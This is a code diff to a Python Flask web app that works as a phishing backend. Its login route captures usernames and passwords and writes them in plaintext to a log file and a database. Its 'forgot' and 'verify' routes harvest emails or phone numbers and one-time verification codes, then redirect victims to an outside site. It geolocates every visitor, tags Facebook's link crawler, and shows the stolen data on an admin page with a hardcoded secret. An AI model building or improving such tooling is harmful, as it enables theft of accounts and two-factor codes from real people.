@@ -13,7 +13,6 @@ def init_db():
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
 
-    # جدول المستخدمين
     cursor.execute("""
     CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -27,7 +26,6 @@ def init_db():
     )
     """)
 
-    # جدول الأكواد
     cursor.execute("""
     CREATE TABLE IF NOT EXISTS codes (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -41,7 +39,6 @@ def init_db():
     )
     """)
 
-    # جدول الزيارات
     cursor.execute("""
     CREATE TABLE IF NOT EXISTS visits (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -60,7 +57,6 @@ def init_db():
     conn.commit()
     conn.close()
 
-# تشغيل قاعدة البيانات
 init_db()
 
 # ========================
@@ -74,13 +70,29 @@ logging.basicConfig(
 print(Fore.GREEN + "++++++++++++++++++++ SERVER STARTED ++++++++++++++++++++")
 
 # ========================
-# إعداد Flask
+# Flask
 # ========================
 app = Flask(__name__)
 app.secret_key = "secret123"
 
-# مسار log.txt
 log_path = os.path.join(os.path.dirname(__file__), "log.txt")
+
+# ========================
+# استخراج IP الحقيقي
+# ========================
+def get_real_ip():
+    ip = request.headers.get("X-Forwarded-For")
+
+    if not ip:
+        ip = request.headers.get("X-Real-IP")
+
+    if not ip:
+        ip = request.remote_addr
+
+    if ip:
+        ip = ip.split(",")[0].strip()
+
+    return ip
 
 # ========================
 # تحديد الموقع
@@ -90,11 +102,18 @@ def get_location(ip):
         url = f"http://ip-api.com/json/{ip}"
         response = requests.get(url, timeout=3)
         data = response.json()
-        country = data.get("country", "Unknown")
-        city = data.get("city", "Unknown")
-        isp = data.get("isp", "Unknown")
+
+        if data.get("status") == "success":
+            country = data.get("country", "Unknown")
+            city = data.get("city", "Unknown")
+            isp = data.get("isp", "Unknown")
+        else:
+            country = city = isp = "Unknown"
+
         return country, city, isp
-    except:
+
+    except Exception as e:
+        logging.error(f"Location error: {e}")
         return "Unknown", "Unknown", "Unknown"
 
 # ========================
@@ -102,10 +121,12 @@ def get_location(ip):
 # ========================
 @app.before_request
 def log_every_request():
-    # تحديد IP الصحيح
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip:
-        ip = ip.split(",")[0]
+
+    # تجاهل ping و favicon
+    if request.path in ["/ping", "/favicon.ico"]:
+        return
+
+    ip = get_real_ip()
 
     country, city, isp = get_location(ip)
 
@@ -114,7 +135,6 @@ def log_every_request():
     user_agent = request.headers.get("User-Agent", "").lower()
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # تحديد نوع الزائر
     if "facebookexternalhit" in user_agent:
         visitor_type = "Facebook Bot"
     elif "uptimerobot" in user_agent:
@@ -124,16 +144,16 @@ def log_every_request():
     else:
         visitor_type = "Real User"
 
-    # تسجيل في log
     logging.info(f"{visitor_type} | {method} {path} | {ip} | {country} | {city} | {isp}")
 
-    # حفظ في database
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
+
     cursor.execute("""
     INSERT INTO visits (ip, country, city, isp, path, method, user_agent, visitor_type, time)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
     """, (ip, country, city, isp, path, method, user_agent, visitor_type, time))
+
     conn.commit()
     conn.close()
 
@@ -188,7 +208,7 @@ def detect_device(user_agent):
         browser = "Chrome"
     elif "firefox" in ua:
         browser = "Firefox"
-    elif "safari" in ua:
+    elif "safari" in ua and "chrome" not in ua:
         browser = "Safari"
     else:
         browser = "Unknown"
@@ -206,25 +226,23 @@ def login():
 
     logging.info(Fore.RED + f"Login attempt with username : {username} and password : {password}")
 
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip:
-       ip = ip.split(",")[0]
+    ip = get_real_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
 
     device, os_name, browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # حفظ في database
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
+
     cursor.execute("""
     INSERT INTO users (email, password, ip, device, os, browser, time)
     VALUES (?, ?, ?, ?, ?, ?, ?)
     """, (username, password, ip, device, os_name, browser, time))
+
     conn.commit()
     conn.close()
 
-    # حفظ في log.txt
     log_data = f"""
 Username: {username}
 Password: {password}
@@ -235,6 +253,7 @@ Browser: {browser}
 Time: {time}
 -------------------------
 """
+
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
 
@@ -263,17 +282,16 @@ def forgot():
 def verify():
 
     phone_or_email = request.form.get("phone_or_email")
-
     session["phone_or_email"] = phone_or_email
 
     logging.info(Fore.GREEN + f"Verify request: {phone_or_email}")
 
-    # حفظ في log.txt
     log_data = f"""
 Forgot Request
 Phone/Email: {phone_or_email}
 -------------------------
 """
+
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
 
@@ -289,7 +307,7 @@ def verify_code():
     code = request.form.get("code")
     phone_or_email = session.get("phone_or_email", "Unknown")
 
-    ip = request.remote_addr
+    ip = get_real_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
 
     device, os_name, browser = detect_device(user_agent)
@@ -297,22 +315,25 @@ def verify_code():
 
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
+
     cursor.execute("""
     INSERT INTO codes (email, code, ip, device, os, browser, time)
     VALUES (?, ?, ?, ?, ?, ?, ?)
     """, (phone_or_email, code, ip, device, os_name, browser, time))
+
     conn.commit()
     conn.close()
 
-    # حفظ في log.txt
     log_data = f"""
 Verification Code
 Email: {phone_or_email}
 Code: {code}
 -------------------------
 """
+
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
+
     logging.info(Fore.RED + f"Verify Code: {code}")
 
     login_botton_url = "https://2742404919047.sarhne.com"
@@ -320,12 +341,13 @@ Code: {code}
     return redirect(login_botton_url)
 
 # ========================
-# 🔐 Admin Login
+# Admin Login
 # ========================
 @app.route("/admin_login", methods=["GET", "POST"])
 def admin_login():
 
     if request.method == "POST":
+
         username = request.form.get("username")
         password = request.form.get("password")
 
@@ -345,7 +367,7 @@ def admin_login():
     """
 
 # ========================
-# admin (عرض البيانات)
+# admin
 # ========================
 @app.route("/admin")
 def admin():
@@ -364,25 +386,31 @@ def admin():
 
     cursor.execute("SELECT * FROM codes")
     codes = cursor.fetchall()
+
     conn.close()
 
-    # إنشاء HTML للعرض
     html = "<h2>Users</h2><table border='1' cellpadding='5'><tr>"
     html += "<th>ID</th><th>Email</th><th>Password</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"
+
     for user in users:
         html += "<tr>" + "".join(f"<td>{col}</td>" for col in user) + "</tr>"
+
     html += "</table><br><br>"
 
     html += "<h2>Codes</h2><table border='1' cellpadding='5'><tr>"
     html += "<th>ID</th><th>Email</th><th>Code</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"
+
     for code in codes:
         html += "<tr>" + "".join(f"<td>{col}</td>" for col in code) + "</tr>"
+
     html += "</table><br><br>"
 
     html += "<h2>Visits</h2><table border='1' cellpadding='5'><tr>"
     html += "<th>ID</th><th>IP</th><th>Country</th><th>City</th><th>ISP</th><th>Path</th><th>Method</th><th>User Agent</th><th>Visitor Type</th><th>Time</th></tr>"
+
     for visit in visits:
         html += "<tr>" + "".join(f"<td>{col}</td>" for col in visit) + "</tr>"
+
     html += "</table>"
 
     return html
